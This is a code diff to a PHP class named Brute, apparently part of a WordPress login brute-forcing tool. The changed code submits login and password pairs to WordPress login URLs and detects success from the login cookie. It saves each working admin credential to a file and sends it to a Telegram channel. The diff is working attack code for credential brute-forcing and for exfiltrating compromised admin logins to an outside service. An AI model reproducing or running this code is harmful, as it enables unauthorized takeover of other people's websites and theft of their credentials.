@@ -29,10 +29,33 @@ class Brute
         $password   = $this->passwordCheck($data, $login);
         $iteration  = $this->checkIterator($data, $login, $password);
 
+        $log = new Logger('name');
+        $authorized = false;
+
+        $body = new FormBody;
+        $body->addField('log', $login);
+        $body->addField('pwd', $password);
+
+        $request = new Request($url, 'POST');
+        $request->setTcpConnectTimeout(2400);
+        $request->setBody($body);
+
         if ($iteration == true) {
+            $response = yield $this->client->request($request);
+            $cookies = $response->getHeaders()['set-cookie'];
 
-            $this->handle($url, $login, $password);
+            foreach ($cookies as $cookie) {
+                if (str_contains($cookie, static::WP_COOKIE_LOGIN))
+                    $authorized = true;
+            }
 
+            if ($authorized == true) {
+                $wp_admin = "{$url};{$login};{$password}";
+                echo "Valid: {$wp_admin}" . PHP_EOL;
+                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
+
+                (new Telegram())->sendMessage($wp_admin);
+            }
         }
     }
 
@@ -59,33 +82,5 @@ class Brute
             return $login;
         else
             return $data['password'];
-    }
-
-    public function handle($url, $login, $password){
-        $log = new Logger('name');
-        $authorized = false;
-
-        $body = new FormBody;
-        $body->addField('log', $login);
-        $body->addField('pwd', $password);
-
-        $request = new Request($url, 'POST');
-        $request->setTcpConnectTimeout(2400);
-        $request->setBody($body);
-
-        $response = yield $this->client->request($request);
-        $cookies = $response->getHeaders()['set-cookie'];
-
-        foreach ($cookies as $cookie) {
-            if (str_contains($cookie, static::WP_COOKIE_LOGIN))
-                $authorized = true;
-        }
-
-        if ($authorized == true) {
-            $wp_admin = "{$url};{$login};{$password}";
-            file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
-
-            (new Telegram())->sendMessage($wp_admin);
-        }
     }
 }
